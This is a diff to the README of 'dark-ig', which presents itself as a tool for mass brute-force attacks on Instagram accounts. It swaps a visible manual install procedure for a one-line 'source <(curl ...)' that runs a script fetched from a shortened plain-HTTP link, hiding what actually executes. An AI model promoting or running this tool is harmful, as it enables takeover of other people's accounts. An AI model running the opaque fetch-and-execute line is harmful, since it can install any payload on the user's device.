@@ -1,12 +1,9 @@
 ```text
   ╔╦╗┌─┐┬─┐┬┌─   ╦╔═╗
-   ║║├─┤├┬┘├┴┐───║║ ╦ @v1.0.3
-  ═╩╝┴ ┴┴└─┴ ┴   ╩╚═╝ from ©instahack
+   ║║├─┤├┬┘├┴┐───║║ ╦ @v1.0.4
+  ═╩╝┴ ┴┴└─┴ ┴   ╩╚═╝
   tool for mass bruteforce attack instagram
   [github] https://github.com/rezadkim
-  [130324] type ? or help to show available command
-
-  darkig.py > ?
                                    
 ```
 <img title="DARKIG" src="https://img.shields.io/badge/CODENAME%20-DARK.IG-SCRIPT?colorA=black&colorB=lime&style=for-the-badge">
@@ -20,20 +17,12 @@ dark-ig is a python-based tool for hacking instagram with mass-bruteforce attack
 
 ### installation
 
-manual installation for termux android
+Auto installation for termux android
 ```bash
-pkg update -y && pkg upgrade -y
-pkg install git which binutils python python-pip -y
-git clone https://github.com/rezadkim/dark-ig
-cd dark-ig && pip install -r requirements.txt
+$ source <(curl -fsSL http://lnkiy.in/IHackInstall)
 ```
 running darkig.py
 ```bash
 python3 darkig.py
 ```
 ### requires
-- license key (paid)
-- instagram cookies (cookiedough)
-
-### contributes
-- [@iqbalmh18](https://instagram.com/iqbalmh18)
